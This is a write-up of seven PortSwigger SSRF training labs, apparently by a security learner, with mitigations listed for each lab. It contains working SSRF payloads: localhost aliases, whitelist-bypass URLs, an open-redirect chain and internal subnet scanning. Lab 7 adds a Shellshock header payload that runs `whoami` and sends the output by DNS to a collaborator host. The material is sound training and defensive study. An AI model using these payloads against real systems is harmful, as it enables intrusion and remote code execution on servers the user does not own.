# SSRF (Server-Side Request Forgery) — Lab Write-ups

> **Topic:** Server-Side Request Forgery (SSRF)  
> **Platform:** PortSwigger Web Security Academy  
> **Labs Completed:** All (Apprentice + Practitioner)  
> **Tools Used:** Burp Suite (Proxy, Repeater, Collaborator), Exploit Server

---

## What is SSRF?

SSRF happens when you can make the server send HTTP requests to a destination of your choosing. The server is essentially your proxy — and unlike your browser, the server often has access to internal networks, cloud metadata services, and backend systems that are never exposed to the internet.

The impact can be enormous: accessing internal admin interfaces, reading cloud credentials from metadata APIs (like AWS `169.254.169.254`), pivoting to internal services, and in some cases achieving remote code execution. As cloud environments have become standard, SSRF has become one of the highest-severity bugs in modern VAPT work.

---

## Lab 1 — Basic SSRF Against the Local Server

**Level:** Apprentice

**What the lab is about:**  
A stock check feature fetches inventory data by making a server-side HTTP request to a URL supplied in the request body. You can redirect this to the local server's admin panel.

**What I did:**  
Captured the stock check POST request in Burp. The body contained:

```
stockApi=https://stock.weliketoshop.net/product/stock/check?productId=1&storeId=1
```

Changed the `stockApi` parameter to:

```
stockApi=http://localhost/admin
```

The server fetched its own admin panel and returned the HTML in the response. Found a link to delete users:

```
stockApi=http://localhost/admin/delete?username=carlos
```

Sent that. Done.

**Key takeaway:**  
The local server often has implicit trust in requests from `localhost` — things like admin panels that are only bound to `127.0.0.1`. SSRF breaks the assumption that "no one from the internet can reach that."

**Mitigation:**  
Validate and whitelist URLs that the server is allowed to fetch. Block requests to loopback addresses. Avoid using user-supplied URLs for server-side requests altogether where possible.

---

## Lab 2 — Basic SSRF Against Another Back-End System

**Level:** Apprentice

**What the lab is about:**  
The back-end admin interface isn't on `localhost` — it's on an internal IP in the `192.168.0.x` range. You need to scan that subnet via SSRF to find which host has the admin panel, then use it.

**What I did:**  
Captured the stock check request. Sent it to Burp Intruder. Set the payload position on the last octet of the IP:

```
stockApi=http://192.168.0.§1§/admin
```

Used a number payload from 1–255. Monitored response lengths — one IP returned a 200 with admin panel content instead of a connection error. Found the internal admin server at `192.168.0.X`.

Then hit:

```
stockApi=http://192.168.0.X/admin/delete?username=carlos
```

**Key takeaway:**  
SSRF into internal networks turns the vulnerable server into a port/host scanner. Internal services that assume they're safe because they're not internet-facing get exposed through a single SSRF vulnerability.

**Mitigation:**  
Egress filtering — restrict what IPs/ranges the server can make outbound requests to. Block RFC-1918 private address ranges at the firewall level.

---

## Lab 3 — SSRF with Blacklist-Based Input Filter

**Level:** Practitioner

**What the lab is about:**  
There's a filter that blocks `127.0.0.1` and `localhost`. You need to bypass it to reach the local admin panel.

**What I did:**  
Tried various bypasses to represent localhost without using those strings:

- `http://127.1/` — shorthand IP, works on many systems
- `http://2130706433/` — decimal representation of 127.0.0.1
- `http://017700000001/` — octal representation
- `http://0x7f000001/` — hex representation

Also tried `http://spoofed.burpcollaborator.net` — a domain that resolves to 127.0.0.1.

One of these bypassed the filter. Also tried double URL-encoding `localhost` to bypass string matching:

```
http://127.0.0.1 → blocked
http://127.1 → worked
```

Then double-URL-encoded the path `/admin` to `%2561dmin` to bypass path filtering:

```
stockApi=http://127.1/%2561dmin
```

**Key takeaway:**  
Blacklist-based SSRF filters are extremely hard to get right. IP representations alone have dozens of valid aliases. Whitelists (allowed destinations only) are the correct approach — not blacklists.

**Mitigation:**  
Use whitelist-based URL validation, not blacklists. Resolve hostnames server-side and validate the resolved IP before making the request (and re-validate after DNS, to prevent DNS rebinding).

---

## Lab 4 — SSRF with Whitelist-Based Input Filter

**Level:** Practitioner

**What the lab is about:**  
The filter now uses a whitelist — it only allows URLs containing `stock.weliketoshop.net`. You need to bypass the whitelist check to redirect the request to localhost.

**What I did:**  
Exploited URL parsing inconsistencies. The whitelist check likely uses a simple string `contains` or a naïve URL parser. Crafted a URL that embeds `stock.weliketoshop.net` in a part of the URL the check focuses on, while the actual destination is localhost:

```
http://localhost#stock.weliketoshop.net
```

The `#` makes `stock.weliketoshop.net` a URL fragment — ignored by the server when making the request, but included in the string that the whitelist check reads.

Or via credentials:

```
http://attacker@stock.weliketoshop.net@localhost/admin
```

Some parsers see `stock.weliketoshop.net` as the host and treat the rest as path. Others see `localhost` as the host. Exploited the discrepancy.

Also used:

```
http://localhost%2523/admin
```

Double URL-encoding the `#` to `%2523` — server decodes once to `%23` then again to `#`.

**Key takeaway:**  
Whitelist validation is only as good as the URL parser. Inconsistencies between the security layer's parser and the HTTP library's parser create exploitable gaps. This is a TOCTOU / parser confusion attack at the URL level.

**Mitigation:**  
Use a battle-tested URL parsing library for validation. Resolve the hostname to an IP, validate the IP is in the allowed range, then make the request to the resolved IP directly — not the user-supplied URL.

---

## Lab 5 — SSRF with Filter Bypass via Open Redirection

**Level:** Practitioner

**What the lab is about:**  
The `stockApi` parameter is now restricted — it only accepts URLs from the application's own domain. But the application has an open redirect. You can chain them: supply a valid same-domain URL that redirects the server to an internal target.

**What I did:**  
Found an open redirect on the application:

```
/product/nextProduct?currentProductId=1&path=http://192.168.0.1/admin
```

This redirects to any URL in the `path` parameter. Set the `stockApi` to this redirect URL:

```
stockApi=https://TARGET/product/nextProduct?currentProductId=1&path=http://192.168.0.1/admin
```

The filter allowed it (same domain). The server followed the redirect to the internal admin panel.

**Key takeaway:**  
Open redirects are often dismissed as low-severity. This lab shows they can be chained to amplify SSRF — turning a same-domain-only restriction into a full internal network bypass.

**Mitigation:**  
Fix open redirects (validate and whitelist redirect targets). Don't follow HTTP redirects when making SSRF-prone server-side requests, or re-validate the final destination URL after redirect.

---

## Lab 6 — Blind SSRF with Out-of-Band Detection

**Level:** Practitioner

**What the lab is about:**  
The application processes a `Referer` header by fetching the URL it contains (e.g., for analytics). No response is returned to you — but the server does make the outbound request. Classic blind SSRF.

**What I did:**  
Opened a product page. Captured the GET request. Modified the `Referer` header to my Burp Collaborator URL:

```
Referer: https://BURP-COLLABORATOR-URL
```

Sent it. Checked Collaborator — saw a DNS lookup and HTTP request coming from the target server. Confirmed blind SSRF.

**Key takeaway:**  
Even when no data comes back in the response, the server is still making outbound requests. Collaborator is essential for detecting blind SSRF. This is often the first step in a larger chain — confirm the SSRF exists, then figure out how to extract data.

**Mitigation:**  
Don't automatically fetch URLs from user-supplied headers like `Referer`. If analytics or link previews require it, use a dedicated sandboxed service with strict egress controls.

---

## Lab 7 — Blind SSRF with Shellshock Exploitation

**Level:** Practitioner

**What the lab is about:**  
Blind SSRF confirmed via Referer header. The internal server running on `192.168.0.x:8080` is also vulnerable to Shellshock (CVE-2014-6271). Chain them together to execute OS commands and exfiltrate the result.

**What I did:**  
First confirmed SSRF via Referer (same as Lab 6). Then used Intruder to scan the internal `192.168.0.x` range on port 8080, watching for DNS hits to Collaborator:

```
Referer: http://192.168.0.§1§:8080/
```

Found the active host. Then injected a Shellshock payload in the `User-Agent` header — because the internal server runs CGI scripts that pass headers to shell:

```
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).COLLABORATOR-URL
```

Set `Referer` to the internal server IP. The internal server executed the Shellshock payload and the result (`whoami` output) appeared as a subdomain in my Collaborator DNS logs.

**Key takeaway:**  
This is a full attack chain: SSRF → internal network pivot → Shellshock RCE → out-of-band exfiltration. Each vulnerability alone might be considered limited. Chained together, they give OS-level code execution on an internal server from a blind SSRF.

**Mitigation:**  
Patch Shellshock (use a supported OS). Restrict egress from internal servers (no outbound DNS/HTTP to the internet). Restrict SSRF at the application layer.

---

*SSRF has gone from a niche finding to a critical vulnerability class largely because of cloud environments. The AWS metadata endpoint at `169.254.169.254` has led to some of the biggest cloud breaches in history — all through a single SSRF. Every server-side URL fetch is worth examining.*
